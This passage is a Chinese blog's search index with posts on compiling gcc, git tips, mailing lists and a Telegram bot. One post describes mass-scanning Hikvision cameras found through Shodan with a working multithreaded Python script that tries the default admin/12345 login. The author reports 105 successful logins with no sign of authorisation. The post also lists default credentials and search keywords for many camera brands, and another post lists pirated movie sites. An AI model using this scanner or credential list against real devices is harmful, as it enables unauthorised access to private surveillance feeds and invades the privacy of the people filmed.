mpfr-3.1.4.tar.bz2 cd mpfr-3.1.4 sudo ./configure --prefix=/opt/mpfr \\ --with-gmp-lib=/opt/gmp/lib \\ --with-gmp-include=/opt/gmp/include sudo make sudo make install ","date":"2019-12-28","objectID":"https://zu1k.com/posts/linux/gcc-compile/:1:2","series":null,"tags":["gcc","compile"],"title":"编译gcc","uri":"https://zu1k.com/posts/linux/gcc-compile/#安装mpfr"},{"categories":["coding"],"content":"安装mpc 从 http://ftp.gnu.org/gnu/mpc/mpc-1.0.3.tar.gz 下载 我选择的是http://ftp.gnu.org/gnu/mpc/mpc-1.0.3.tar.gz tar zxf mpc-1.0.3.tar.gz cd mpc-1.0.3 sudo ./configure --prefix=/opt/mpc \\ --with-gmp-lib=/opt/gmp/lib \\ --with-gmp-include=/opt/gmp/include \\ --with-mpfr-lib=/opt/mpfr/lib \\ --with-mpfr-include=/opt/mpfr/include sudo make sudo make install 上面依赖安装顺序不能错 后来听曹老师说可以用 apt 直接安装，血亏 sudo apt install libmpc-dev libmpfr-dev libgmp-dev libgmp3-dev 又一个后来，发现 gcc 源码中有脚本可以一键下载安装这些依赖 sh ./contrib/download_prerequisites ","date":"2019-12-28","objectID":"https://zu1k.com/posts/linux/gcc-compile/:1:3","series":null,"tags":["gcc","compile"],"title":"编译gcc","uri":"https://zu1k.com/posts/linux/gcc-compile/#安装mpc"},{"categories":["coding"],"content":"编译 然后进入gcc目录 配置编译配置 ./configure \\ --enable-checking=release \\ --enable-languages=c,c++ \\ --disable-multilib 执行 make -j8 然后去喝功夫茶 ","date":"2019-12-28","objectID":"https://zu1k.com/posts/linux/gcc-compile/:2:0","series":null,"tags":["gcc","compile"],"title":"编译gcc","uri":"https://zu1k.com/posts/linux/gcc-compile/#编译"},{"categories":["share"],"content":"奈菲影视 https://www.nfmovies.com/ ","date":"2019-12-18","objectID":"https://zu1k.com/posts/share/pirated-movie/:0:1","series":null,"tags":["影视"],"title":"盗版影视站","uri":"https://zu1k.com/posts/share/pirated-movie/#奈菲影视"},{"categories":["share"],"content":"团长资源 https://tzfile.com/ ","date":"2019-12-18","objectID":"https://zu1k.com/posts/share/pirated-movie/:0:2","series":null,"tags":["影视"],"title":"盗版影视站","uri":"https://zu1k.com/posts/share/pirated-movie/#团长资源"},{"categories":["share"],"content":"低端影视 http://ddrk.me/ ","date":"2019-12-18","objectID":"https://zu1k.com/posts/share/pirated-movie/:0:3","series":null,"tags":["影视"],"title":"盗版影视站","uri":"https://zu1k.com/posts/share/pirated-movie/#低端影视"},{"categories":["share"],"content":"人人影视 http://www.zmz2019.com/ ","date":"2019-12-18","objectID":"https://zu1k.com/posts/share/pirated-movie/:0:4","series":null,"tags":["影视"],"title":"盗版影视站","uri":"https://zu1k.com/posts/share/pirated-movie/#人人影视"},{"categories":["share"],"content":"远鉴字幕组 https://yj.apkgm.top/ ","date":"2019-12-18","objectID":"https://zu1k.com/posts/share/pirated-movie/:0:5","series":null,"tags":["影视"],"title":"盗版影视站","uri":"https://zu1k.com/posts/share/pirated-movie/#远鉴字幕组"},{"categories":["share"],"content":"tg帮找资源频道 https://t.me/s/lovesource https://www.netflixstar.top/ https://1090ys.com/ ","date":"2019-12-18","objectID":"https://zu1k.com/posts/share/pirated-movie/:0:6","series":null,"tags":["影视"],"title":"盗版影视站","uri":"https://zu1k.com/posts/share/pirated-movie/#tg帮找资源频道"},{"categories":["thinking"],"content":"去年的某个周末，我偶然在腾讯视频看到了一部连续短剧《东方华尔街》，刚看第一集就被深深吸引住了。《东方华尔街》讲述的是一队隐于世的金融雇佣兵，狙击政经界传奇人物，并搅动整个金融市场的复仇故事。故事吸引我的不仅仅是故事中的师徒情谊、恩怨之争、社会责任，更有整个连续短剧中贯穿的金融内容。这队人通过金融、传媒、政治等各方面手段操纵整个金融市场，继而决定整个金融社会的走势，这让我对金融相关知识愈发感兴趣起来。 在看完这个连续短剧之后，我又去学校图书馆查找相关书籍，书架上书太多了，太专业的看不懂，自己还是对金融相关发展历史和故事比较感兴趣，所以最终决定看《货币战争》。 后续因为期末考试书没有看完，这段故事就告一段落。 这段时间，正在kindle上阅读刚下载的几本书《坏血：一个硅谷巨头的秘密与谎言》、《金钱永不眠：资本世界的暗流涌动和金融逻辑》，书还没看完，但却勾起了我对金融学、经济学等相关知识更加深入了解的念头。 这段时间是期末考试月，越到考试月，这个人在无聊的情况下想的事情越多，加上今年发生的种种事情、各种乱七八糟颠覆我世界观的新闻，我对一些事物的概念越发模糊起来。 什么是国家？ 什么是政治？ 什么是社会？ 什么是经济？ 什么是金融？ 什么是资本？ 等等。。。 这些概念最初接触应该是初高中的政治课上，但是学习的也不够深入，或者说学的东西太模糊了，感觉跟现实世界的一些东西有些偏差，在生活中越发发现有些东西是需要自己去体悟自己去领会的。 一个人的世界观、金钱观、人生观、、、等等各种观，我们从小接受的教育，都是正确的吗？或者说没有什么正确的东西，只有适合这个时代、适合这个社会、适合当前的一些东西。 自己出生于农村家庭，也没有去过国外，就连出省也仅有两次，对这个世界的认识还是太浅了。在网络上看到一些事情，在一些平台上看到国外从未了解过的国家的一些事情，发现自己从小到大所受的教育有很多东西已经不适合这个时代了，也不能说过时，感觉上就是太理想化了，或者说之前想的太简单了，很多事情不能说“不是这样”，而是“并不仅仅是我想的这样”。 好啦，不说了，貌似跑题了，也没关系啦，拜拜，读到这里的陌生人。 假期要看的 连续剧 《富翁》 《亿万》 电影 《华尔街》 《华尔街2：金钱永不眠》 迁移丢失的评论 Scarlett 2020年3月1日 上午1:06 货币战争并不建议阅读，一个小技巧是阅读前先看豆瓣的评分书评。 另外推荐书: 《灭火》 《聪明的投资者》 《随机漫步的傻瓜》 《投资学精要》 《金融学》 《漫步华尔街》 《伟大的博弈》 《战胜华尔街》 《逆向思考的艺术》 《格雷厄姆投资指南》 《投资最重要的事》 ","date":"2019-12-16","objectID":"https://zu1k.com/posts/thinking/capital-financial-economic/:0:0","series":null,"tags":["thinking"],"title":"资本、金融、经济","uri":"https://zu1k.com/posts/thinking/capital-financial-economic/#"},{"categories":["coding"],"content":"git reflog git reflog 可以查看所有分支的所有操作记录（包括（包括commit和reset的操作），包括已经被删除的commit记录，git log则不能察看已经删除了的commit记录，而且跟进结果可以回退道某一个修改 有时候想要删除reflog记录，可以使用下面的命令 首先确保所有分支都没有引用该提交，包括HEAD也不指向这个提交。 然后 git reflog expire –expire=now –all (这会清除分支变更历史) 然后 git gc –prune=now (不用调整时间，加上–prune=now命令即可) ","date":"2019-12-01","objectID":"https://zu1k.com/posts/learn/some-git-skills/:0:1","series":null,"tags":["Git"],"title":"一些我刚学到的GIT技巧","uri":"https://zu1k.com/posts/learn/some-git-skills/#git-reflog"},{"categories":["coding"],"content":"git rebase 参考文章：http://jartto.wang/2018/12/11/git-rebase/ 可以合并多次提交记录: git rebase -i HEAD~4 可以合并分支而不产生merge记录 ","date":"2019-12-01","objectID":"https://zu1k.com/posts/learn/some-git-skills/:0:2","series":null,"tags":["Git"],"title":"一些我刚学到的GIT技巧","uri":"https://zu1k.com/posts/learn/some-git-skills/#git-rebase"},{"categories":["coding"],"content":"前言 在我上高二的时候，海康威视摄像头被爆出大量公开web访问具有弱密码，那时手动对学校内部的摄像头进行fuzz，成功进入了几个摄像头控制web，能够随意查看学校的监控。 海康威视web界面的弱密码是 admin 12345 时隔四年，想要再次对网络上能够访问到的海康威视web管理进行一次批量弱密码扫描 ","date":"2019-11-28","objectID":"https://zu1k.com/posts/security/web-security/scan-hikvision-weak-password/:1:0","series":null,"tags":["scan","web"],"title":"针对海康威视网络摄像头弱密码的一次扫描","uri":"https://zu1k.com/posts/security/web-security/scan-hikvision-weak-password/#前言"},{"categories":["coding"],"content":"从shodan获取数据 首先需要搞到全网所有能够访问到的海康威视机器的IP，这是个工作量极大的任务，如果自己进行全网服务扫描的话无论是时间周期还是耗费资金都是我无法承受的 之前了解过shodan，shodan被称为“最恐怖的搜索引擎”，能够提供多年来其扫描到的全网提供的服务，可惜数据的价格极高 今年黑五是shodan诞生第十年，shodan给出极大的优惠，正式会员+20credit只需要1刀，手头有信用卡和企业邮箱的我二话不说先上了20个账号 有了shodan的credit就可以购买它的数据了。海康威视的web管理界面的关键词很简单，只需要在shodan搜索“hikvision” 在我写这篇博客的时候搜索到的数据有18万条，前段时间我下载数据的时候是19万条。 下载大量数据是需要花credit的，1credit可以下载1万条数据，所以19万多的数据花费了我20credit，正常情况下20credit是49刀，这次黑五真是太实惠了 ","date":"2019-11-28","objectID":"https://zu1k.com/posts/security/web-security/scan-hikvision-weak-password/:2:0","series":null,"tags":["scan","web"],"title":"针对海康威视网络摄像头弱密码的一次扫描","uri":"https://zu1k.com/posts/security/web-security/scan-hikvision-weak-password/#从shodan获取数据"},{"categories":["coding"],"content":"提取有用信息 有了数据之后通过python解析，检查是否存在http服务，如果存在就提取ip和port #!/usr/bin/env python #-*-coding:utf-8-*- import json fi = open(\"shodan_data.json\") fo = open(\"ip.txt\", 'w') line = fi.readline() numall = 1 num = 0 while line: line = fi.readline() numall = numall+1 try: a = json.loads(line) if 'http' in a: num = num+1 txt = a['http']['host']+':'+str(a['port'])+'\\n' fo.write(txt) print(txt) except Exception as e: continue fo.close() fi.close() print(numall) print(num) ","date":"2019-11-28","objectID":"https://zu1k.com/posts/security/web-security/scan-hikvision-weak-password/:3:0","series":null,"tags":["scan","web"],"title":"针对海康威视网络摄像头弱密码的一次扫描","uri":"https://zu1k.com/posts/security/web-security/scan-hikvision-weak-password/#提取有用信息"},{"categories":["coding"],"content":"分析与扫描 然后通过多线程python脚本进行弱密码批量扫描。 通过手工尝试找到一台可以弱密码登录进去的机器，通过burp抓包分析，找到用来验证弱密码的接口。 分析发现登录使用的是base auth，这就简单了。使用的接口是userCheck，如果登录成功应该返回200. #!/usr/bin/env python #-*-coding:utf-8-*- #批量筛选海康威视摄像头的弱密码 import threading import requests import queue import sys import re def Threads(): threadlist=[] myqueue=queue.Queue() for ip in open('ip.txt','r'): #扫描出的ip myqueue.put(ip.replace('\\n','')) for x in range(0,100): #线程数 th=threading.Thread(target=scan_Hikvision,args=(myqueue,)) threadlist.append(th) for t in threadlist: t.start() for t in threadlist: t.join() def scan_Hikvision(myqueue): while not myqueue.empty(): ip=myqueue.get() try: print(\"[*]scan:\"+ip) r = requests.get(url=(\"http://%s/PSIA/Custom/HIK/userCheck\" % ip),auth=('admin','12345'),timeout=10) status = re.findall(r'\u003cstatusValue\u003e(.*)\u003c/statusValue\u003e', r.text) if status[0] == '200': print('[√] Host http://'+ ip +' Login Success!\\n') f = open('ok.txt', 'a+') f.write(ip+\"\\n\") f.close() break except: continue if __name__=='__main__': Threads() 正好有个美国的vps，就扔到这个服务器上进行扫描，本机也开起来扫 100线程很快就扫描完毕了，国内外扫描完的结果去重后一共留下105个可登录弱密码。感觉不应该只有这么点，登录后查看只发现一个版本的海康威视，可能是检测弱密码的接口在其他版本中不存在，或者其他版本默认密码更换或者其他原因 ","date":"2019-11-28","objectID":"https://zu1k.com/posts/security/web-security/scan-hikvision-weak-password/:4:0","series":null,"tags":["scan","web"],"title":"针对海康威视网络摄像头弱密码的一次扫描","uri":"https://zu1k.com/posts/security/web-security/scan-hikvision-weak-password/#分析与扫描"},{"categories":["coding"],"content":"后话 海康威视应该是采取了手段来避免弱密码的再次产生，但是之前老版本的DVR还有一部分并没有进行更新，大部分是农村的家庭或工厂监控，大家也都不太懂，并没有修改默认密码 心里不是滋味，身边也有一些父母的朋友他们让我帮忙安装一些路由器、监控等设备，他们的文化水平不高，当我要给他们修改密码的时候，一部分会选择手机号码，也有一部分让我不要修改密码，说改了别记不住，直接出厂密码就行了，忘了可以看一下说明书 能不能想出一种办法，既考虑到安全性，又能顾虑到这部分人的需求，这是个问题 ","date":"2019-11-28","objectID":"https://zu1k.com/posts/security/web-security/scan-hikvision-weak-password/:5:0","series":null,"tags":["scan","web"],"title":"针对海康威视网络摄像头弱密码的一次扫描","uri":"https://zu1k.com/posts/security/web-security/scan-hikvision-weak-password/#后话"},{"categories":["coding"],"content":"弱密码收集 1.海康威视IP网络摄像机： 用户：admin，密码：12345 zoomeye搜索关键词：hikvision 2.大华网络摄像机： user:admin pass:admin 管理权限 user:default pass:user 用户默认登陆帐号 user:888888 pass:admin user:666666 pass:user zoomeye搜索关键词：WEB SERVICE 3.cctv摄像机： user：admin pass：空 telnet登陆 user：root pass：”juantech” zoomeye搜索关键词：JAWS/1.0 4.SQ-WEBCAM摄像机： user：admin pass：admin zoomeye搜索关键词：SQ-WEBCAM ACTi: admin/123456 or Admin/123456 American Dynamics: admin/admin or admin/9999 Arecont Vision: none Avigilon: admin/admin Axis: traditionally root/pass, new Axis cameras require password creation during first login Basler: admin/admin Bosch: none Brickcom: admin/admin Canon: root/camera Cisco: No default password, requires creation during first login Dahua: admin/admin Digital Watchdog: admin/admin DRS: admin/1234 DVTel: Admin/1234 DynaColor: Admin/1234 FLIR: admin/fliradmin Foscam: admin/ GeoVision: admin/admin Grandstream: admin/admin Hikvision: admin/12345 Honeywell: admin/1234 IQinVision: root/system IPX-DDK: root/admin or root/Admin\\ JVC: admin/jvc March: Networks: admin/ Mobotix: admin/meinsm Panasonic: admin/12345 Pelco Sarix: admin/admin Pixord: admin/admin Samsung Electronics: root/root or admin/4321 Samsung Techwin (old): admin/1111111 Samsung (new): admin/4321 Sanyo: admin/admin Scallop: admin/password Sentry360 (mini): admin/1234 Sentry360 (pro): none Sony: admin/admin Speco: admin/1234 Stardot: admin/admin Starvedia: admin/ Trendnet: admin/admin Toshiba: root/ikwd VideoIQ: supervisor/supervisor Vivotek: root/ Ubiquiti: ubnt/ubnt Wodsee: admin/ ","date":"2019-11-28","objectID":"https://zu1k.com/posts/security/web-security/scan-hikvision-weak-password/:6:0","series":null,"tags":["scan","web"],"title":"针对海康威视网络摄像头弱密码的一次扫描","uri":"https://zu1k.com/posts/security/web-security/scan-hikvision-weak-password/#弱密码收集"},{"categories":["learn"],"content":" 之前经常听说或者在新闻里见到邮件列表这个词，知道很多大佬，特别是计算机大佬、某某编程语言之父、某某操作系统之父等一堆大佬都在用邮件列表，就感到十分好奇。近期我特意上网搜索相关资料，亲身实践邮件列表的使用 ","date":"2019-11-27","objectID":"https://zu1k.com/posts/learn/maillist/:0:0","series":null,"tags":["Email"],"title":"了解邮件列表","uri":"https://zu1k.com/posts/learn/maillist/#"},{"categories":["learn"],"content":"什么是邮件列表 邮件列表（Mailing List）的起源可以追溯到1975年，是互联网上最早的社区形式之一，也是Internet上的一种重要工具，用于各种群体之间的信息交流和信息发布 邮件列表根据不同作用分为不同形式，其实我们生活中也有接触和使用过邮件列表这个东东，只是自己不知道这个东西就要邮件列表而已 ","date":"2019-11-27","objectID":"https://zu1k.com/posts/learn/maillist/:1:0","series":null,"tags":["Email"],"title":"了解邮件列表","uri":"https://zu1k.com/posts/learn/maillist/#什么是邮件列表"},{"categories":["learn"],"content":"常见的邮件列表有六种形式 电子刊物 新闻邮件 注册会员通讯 新产品通知 顾客服务/顾客关系邮件 顾客定制信息 ","date":"2019-11-27","objectID":"https://zu1k.com/posts/learn/maillist/:1:1","series":null,"tags":["Email"],"title":"了解邮件列表","uri":"https://zu1k.com/posts/learn/maillist/#常见的邮件列表有六种形式"},{"categories":["learn"],"content":"根据不同的邮件分发方式，邮件列表可以分为两大类 公告型(Announcement list) 讨论型(Discussion list) 公告型 顾名思义就是类似于公告板，管理员可以给邮件列表所有成员发送公告邮件，比如我们常见的 广告邮件、新闻邮件、通知邮件等 讨论型 通俗点讲，就是一堆人加入一个列表中，这个列表有一个公用的邮箱地址，你可以给这个邮箱地址发邮件，他会自动将邮件转发给列表中的每一个人，列表中的成员可以直接通过回复邮件参与讨论，讨论内容同样会被转发给每一个人 公告型邮件列表我们在生活中经常用，不需要多说，这篇文章我们主要来实践 讨论型 邮件列表的使用 下面提到的邮件列表一词特指讨论型邮件列表 ","date":"2019-11-27","objectID":"https://zu1k.com/posts/learn/maillist/:1:2","series":null,"tags":["Email"],"title":"了解邮件列表","uri":"https://zu1k.com/posts/learn/maillist/#根据不同的邮件分发方式邮件列表可以分为两大类"},{"categories":["learn"],"content":"哪里用到邮件列表 其实很多地方会用到邮件列表，特别是在计算机领域，很多大佬喜欢用。他们认为网页论坛内容杂乱，无法进行深入、高效的交流，内容往往缺乏思考和谨慎。邮件就恰恰相反，发邮件时我们往往会进行慎重思考，深思熟虑之后写一长篇文章，这样最有利于交流 QQ邮箱中会看到群邮件功能，这其实就是一个讨论型的邮件列表功能。但这一功能实际上只有极少一部分人充分利用了起来，绝大多数群并没有有效的利用。这个功能现大多沦为广告和病毒木马多发地，真是令人惋惜 Debian、维基百科等大型组织大都自己搭建邮件列表服务，而大部分中小组织都时直接使用Google Group提供的服务，Google Group应该拥有最多的邮件列表 现在Github仓库的Issue功能也与邮件列表差不多了，watching该仓库的人可以收到对应的邮件，也可以通过邮件进行回复 ","date":"2019-11-27","objectID":"https://zu1k.com/posts/learn/maillist/:2:0","series":null,"tags":["Email"],"title":"了解邮件列表","uri":"https://zu1k.com/posts/learn/maillist/#哪里用到邮件列表"},{"categories":["learn"],"content":"如何使用邮件列表 接下来我们实践如何加入一个邮件列表、在邮件列表中发起讨论、参与邮件列表中已经发起的讨论、退出邮件列表等常用操作 ","date":"2019-11-27","objectID":"https://zu1k.com/posts/learn/maillist/:3:0","series":null,"tags":["Email"],"title":"了解邮件列表","uri":"https://zu1k.com/posts/learn/maillist/#如何使用邮件列表"},{"categories":["learn"],"content":"加入邮件列表 加入一个邮件列表有两种方法: 通过在网页填写自己的邮箱地址加入 比较正统的方法，通过发送邮件加入 我们以 sdusec@googlegroups.com 这个邮件列表为例，演示如何加入它 邮件列表有一个主邮箱地址，同时有一些辅助邮箱地址，通过发送邮件加入邮件列表需要使用 sdusec+subscribe@googlegroups.com 这个辅助邮箱地址 在Google Group中订阅一个邮箱列表可以给 邮件列表名+subscribe@googlegroups.com 这个邮箱地址发任意邮件，这里需要注意不能省略加号 在发送邮件后就会收到邮件列表的确认邮件，按照提示回复或点击按钮即可成功加入，对于Google Group我们回复confirm进行确定 然后我们就会收到加入成功的通知，有些列表需要管理员进行审核，等待即可 审核通过后也会收到邮件通知 一些其他类型邮箱列表的加入方式可能稍有不同，其中有一部分需要发送主题为 subscribe 的邮件才能加入，同时订阅的邮箱地址不是**+subscribe**，而是**-subscribe**，这里是减号 这里介绍的是通用方法，可能与某些邮件列表的方法不符，在尝试加入一个邮件列表之前你需要通过说明页面查看具体的订阅方法 ","date":"2019-11-27","objectID":"https://zu1k.com/posts/learn/maillist/:3:1","series":null,"tags":["Email"],"title":"了解邮件列表","uri":"https://zu1k.com/posts/learn/maillist/#加入邮件列表"},{"categories":["learn"],"content":"发起讨论 在邮件列表中发起讨论也是通过发送邮件来实现的，将讨论的内容发送给公共的邮箱地址，例如发送给sdusec@googlegroups.com，邮件列表服务器就会将你的邮件发送给订阅该列表的每一个人 注意，不要往主邮箱地址发送垃圾内容，否则会引起大家的反感。同时，在发起讨论前你要精心编辑问题内容和标题，发布高质量的讨论而不是垃圾 ","date":"2019-11-27","objectID":"https://zu1k.com/posts/learn/maillist/:3:2","series":null,"tags":["Email"],"title":"了解邮件列表","uri":"https://zu1k.com/posts/learn/maillist/#发起讨论"},{"categories":["learn"],"content":"参与讨论 如果你收到一封邮件，想要参与讨论，只需要回复这封邮件 一般情况下我们使用的邮件服务会自动将标题重命名为 Re: 原标题或者回复：原标题的格式，同时正文内容中会引用被回复的邮件内容。如果你是用的邮箱系统不支持这个操作，建议切换至Gmail 注意，点击发送前观察你回复的是不是公共邮箱，只有这样其他人所有人才能看到你回复的内容 如果回复内容只想让部分人可见，需要手动指定回复的邮箱地址 ","date":"2019-11-27","objectID":"https://zu1k.com/posts/learn/maillist/:3:3","series":null,"tags":["Email"],"title":"了解邮件列表","uri":"https://zu1k.com/posts/learn/maillist/#参与讨论"},{"categories":["learn"],"content":"退订邮件列表 与加入方式类似，需要将subscribe换成unsubscribe ","date":"2019-11-27","objectID":"https://zu1k.com/posts/learn/maillist/:3:4","series":null,"tags":["Email"],"title":"了解邮件列表","uri":"https://zu1k.com/posts/learn/maillist/#退订邮件列表"},{"categories":["learn"],"content":"如何用好邮件列表 使用邮件列表非常简单，但是想要用好还是得花点功夫。无论是邮件的标题还是内容，都需要精心准备，否则会被列表中的其他人视作垃圾或问题被忽视 ","date":"2019-11-27","objectID":"https://zu1k.com/posts/learn/maillist/:4:0","series":null,"tags":["Email"],"title":"了解邮件列表","uri":"https://zu1k.com/posts/learn/maillist/#如何用好邮件列表"},{"categories":["learn"],"content":"Email格式 设置好签名档 公务邮箱应该包括姓名, 公司名称, 地址, 传真, 联系方式等 私人邮箱包括姓名(如经常与国外往来,应使用拼音或英文名), 邮箱地址, blog等必要信息 清晰简明的标题，30字以内, 尽可能的包含5W1H 可以添加标签, 方便收件人客户端自动分类.如, 通知, 汇报等 抬头, 落款 ","date":"2019-11-27","objectID":"https://zu1k.com/posts/learn/maillist/:4:1","series":null,"tags":["Email"],"title":"了解邮件列表","uri":"https://zu1k.com/posts/learn/maillist/#email格式"},{"categories":["learn"],"content":"内容表述 倒金字塔叙事 开头讲清楚概括大意, 讲清楚5W1H 慢慢展开，旁征博引 5W1H who 谁 When 何时 Where 何地, 或什么过程中 What 遇到了什么问题 Why 为何会出现这个问题 How 如何,或进行过怎样的尝试, 以及其他方便他人理解问题的信息 ","date":"2019-11-27","objectID":"https://zu1k.com/posts/learn/maillist/:4:2","series":null,"tags":["Email"],"title":"了解邮件列表","uri":"https://zu1k.com/posts/learn/maillist/#内容表述"},{"categories":["learn"],"content":"内容表述 倒金字塔叙事 开头讲清楚概括大意, 讲清楚5W1H 慢慢展开，旁征博引 5W1H who 谁 When 何时 Where 何地, 或什么过程中 What 遇到了什么问题 Why 为何会出现这个问题 How 如何,或进行过怎样的尝试, 以及其他方便他人理解问题的信息 ","date":"2019-11-27","objectID":"https://zu1k.com/posts/learn/maillist/:4:2","series":null,"tags":["Email"],"title":"了解邮件列表","uri":"https://zu1k.com/posts/learn/maillist/#5w1h"},{"categories":["learn"],"content":"提问的智慧 提问之前 Google it 询问精通此道的身边人 三思而后问 怎样提问 语法正确, 拼写无误 精确描述, 信息量大 只说症状, 不说猜想 问题解决后要有简短声明 具体参见http://wiki.woodpecker.org.cn/moin/AskForHelp… 附件文档请输出为pdf版 ","date":"2019-11-27","objectID":"https://zu1k.com/posts/learn/maillist/:4:3","series":null,"tags":["Email"],"title":"了解邮件列表","uri":"https://zu1k.com/posts/learn/maillist/#提问的智慧"},{"categories":["learn"],"content":"提问的智慧 提问之前 Google it 询问精通此道的身边人 三思而后问 怎样提问 语法正确, 拼写无误 精确描述, 信息量大 只说症状, 不说猜想 问题解决后要有简短声明 具体参见http://wiki.woodpecker.org.cn/moin/AskForHelp… 附件文档请输出为pdf版 ","date":"2019-11-27","objectID":"https://zu1k.com/posts/learn/maillist/:4:3","series":null,"tags":["Email"],"title":"了解邮件列表","uri":"https://zu1k.com/posts/learn/maillist/#提问之前"},{"categories":["learn"],"content":"提问的智慧 提问之前 Google it 询问精通此道的身边人 三思而后问 怎样提问 语法正确, 拼写无误 精确描述, 信息量大 只说症状, 不说猜想 问题解决后要有简短声明 具体参见http://wiki.woodpecker.org.cn/moin/AskForHelp… 附件文档请输出为pdf版 ","date":"2019-11-27","objectID":"https://zu1k.com/posts/learn/maillist/:4:3","series":null,"tags":["Email"],"title":"了解邮件列表","uri":"https://zu1k.com/posts/learn/maillist/#怎样提问"},{"categories":["learn"],"content":"避免邮件出现乱码 注意编码格式，使用utf-8编码, 不要使用GBK之类的编码 避免中文标点 使用常见的emoji，避免使用生僻的图标 ","date":"2019-11-27","objectID":"https://zu1k.com/posts/learn/maillist/:4:4","series":null,"tags":["Email"],"title":"了解邮件列表","uri":"https://zu1k.com/posts/learn/maillist/#避免邮件出现乱码"},{"categories":["learn"],"content":"防止线索断开 在使用邮件列表的过程中，会遇到线索断开的情况 当看到有人提到线索断了的时候，就需要检查自己回复的邮件，标题是否有 RE原邮件 ，内容中是否有引用被回复的邮件 正常情况下你使用的邮件软件会自动完成这些内容，如果没有那你得考虑更换邮件软件或者服务 ","date":"2019-11-27","objectID":"https://zu1k.com/posts/learn/maillist/:4:5","series":null,"tags":["Email"],"title":"了解邮件列表","uri":"https://zu1k.com/posts/learn/maillist/#防止线索断开"},{"categories":["learn"],"content":"一些邮件列表 https://lists.wikimedia.org/mailman/listinfo ","date":"2019-11-27","objectID":"https://zu1k.com/posts/learn/maillist/:5:0","series":null,"tags":["Email"],"title":"了解邮件列表","uri":"https://zu1k.com/posts/learn/maillist/#一些邮件列表"},{"categories":["learn"],"content":"附加资料 https://en.wikipedia.org/wiki/Posting_style ","date":"2019-11-27","objectID":"https://zu1k.com/posts/learn/maillist/:6:0","series":null,"tags":["Email"],"title":"了解邮件列表","uri":"https://zu1k.com/posts/learn/maillist/#附加资料"},{"categories":["coding"],"content":"功能 下面简单说一下机器人实现的一些功能，具体还是推荐你亲身进行体验。 首先为了满足最初的需求，机器人需要能够对特定关键词回复特定的文字内容。 为了能够更加灵活的匹配关键词，针对关键词识别增加了正则匹配方式的关键词识别方法，可以让用户能够编写更加灵活的关键词规则。 为了满足更加更多种类的回复内容，回复种类除了文字还增加了照片、动图、视频、文件、表情、Marddown等其他的回复种类，并且允许给图片、文件等添加描述信息。 为了满足部分群组的多样化回复需求，回复方式增加了 多个回复消息混合、多个回复类型混合、回复内容随机选择 等复杂但灵活的规则配置方式。 为了能够实现部分群管功能，回复类型增加了群管操作，包括 消息删除、消息置顶、人员禁言、人员踢出等功能，只需要设置相应的关键词回复规则即可。 除了关键词功能外，我还给机器人增加了群管命令、获取用户id信息、禁言游戏、加群欢迎、退群送别、一键呼叫所有管理员等功能。 下面我将演示一些基本的功能配置和使用方法。 ","date":"2019-11-26","objectID":"https://zu1k.com/posts/coding/telegram-keyword-reply-bot/:1:0","series":null,"tags":["telegram","bot","coding"],"title":"Telegram关键词自动回复机器人","uri":"https://zu1k.com/posts/coding/telegram-keyword-reply-bot/#功能"},{"categories":["coding"],"content":"使用示例 关键词规则的使用 添加规则使用 /add 关键词===回复内容 删除规则使用 /del 关键词 查看规则在群组里使用 /list ","date":"2019-11-26","objectID":"https://zu1k.com/posts/coding/telegram-keyword-reply-bot/:2:0","series":null,"tags":["telegram","bot","coding"],"title":"Telegram关键词自动回复机器人","uri":"https://zu1k.com/posts/coding/telegram-keyword-reply-bot/#使用示例"},{"categories":["coding"],"content":"回复文本内容 /add 汉化===tg支持语言包功能，点击【链接】即可修改为中文。 添加这条规则之后，机器人就会对每一条包含有“汉化”关键词的消息回复“tg支持语言包功能，点击【链接】即可修改为中文。”这个特定内容。 回复文字支持markdown语法，添加前缀 md:: 即可使用 /add testmd===md::加粗**bold** ","date":"2019-11-26","objectID":"https://zu1k.com/posts/coding/telegram-keyword-reply-bot/:2:1","series":null,"tags":["telegram","bot","coding"],"title":"Telegram关键词自动回复机器人","uri":"https://zu1k.com/posts/coding/telegram-keyword-reply-bot/#回复文本内容"},{"categories":["coding"],"content":"回复图片 /add 关键词===photo::图片链接 图片链接需要时互联网上tg服务器可以访问到的图片，可以是tg上公开群组或者频道的图片消息链接或者互联网上任意图片资源链接 例如： /add 小白兔===photo::https://img.cdn.com/tupian.jpg /add 小可爱===photo::https://t.me/peekfun/1000 ","date":"2019-11-26","objectID":"https://zu1k.com/posts/coding/telegram-keyword-reply-bot/:2:2","series":null,"tags":["telegram","bot","coding"],"title":"Telegram关键词自动回复机器人","uri":"https://zu1k.com/posts/coding/telegram-keyword-reply-bot/#回复图片"},{"categories":["coding"],"content":"回复动图\\视频\\文件 机器人除了回复图片外，还支持回复动图、视频、文件，如果你已经学会了回复图片，那这些种类也没有问题。 动图 /add 关键词===gif::动图链接 视频 /add 关键词===video::视频链接 文件 /add 关键词===file::文件链接 需要注意的是，各种链接要么是tg上公开群组或者频道的链接（私有群组不行），要么是互联网上的资源链接，注意链接需要与发送的种类对应好。 ","date":"2019-11-26","objectID":"https://zu1k.com/posts/coding/telegram-keyword-reply-bot/:2:3","series":null,"tags":["telegram","bot","coding"],"title":"Telegram关键词自动回复机器人","uri":"https://zu1k.com/posts/coding/telegram-keyword-reply-bot/#回复动图视频文件"},{"categories":["coding"],"content":"图片\\文件添加文字 在手动发送图片等的时候我们可以添加描述信息，机器人回复规则也可以。 为了便于理解，添加了缩进和换行，添加规则的时候不要缩进和换行 /add 关键词===photo::图片链接::描述文字 /add 小白兔=== photo::https://img.cdn.com/tupian.jpg :: 这里是描述文字，例如原来你也喜欢小白兔呀 文件的使用也是类似，就不再重复 注意：图片和文件的介绍文字默认开启markdown语法 ","date":"2019-11-26","objectID":"https://zu1k.com/posts/coding/telegram-keyword-reply-bot/:2:4","series":null,"tags":["telegram","bot","coding"],"title":"Telegram关键词自动回复机器人","uri":"https://zu1k.com/posts/coding/telegram-keyword-reply-bot/#图片文件添加文字"},{"categories":["coding"],"content":"正则表达式进行匹配 现在你已经会使用关键词来回复特定内容了，但是为了更加灵活的回复，而不是令机器人看起来傻乎乎的 事实上机器人聪明与否完全看你设置的关键词规则是否灵活，你需要学习简单的正则表达式并且利用正则来进行匹配。 使用正则匹配非常简单，只需要将原来的关键词替换为 re:正则规则 即可。 /add re:(如何|怎样).*(激活|使用)===请查看这个说明 在这个例子里面，使用了正则表达式进行了匹配，此时用户发送 “有谁知道怎样进行账号的激活吗？”也可以匹配上，这大大提高了规则的灵活性。 需要说明的是，机器人的所有关键词使用方法均支持正则，你可以随意进行尝试。 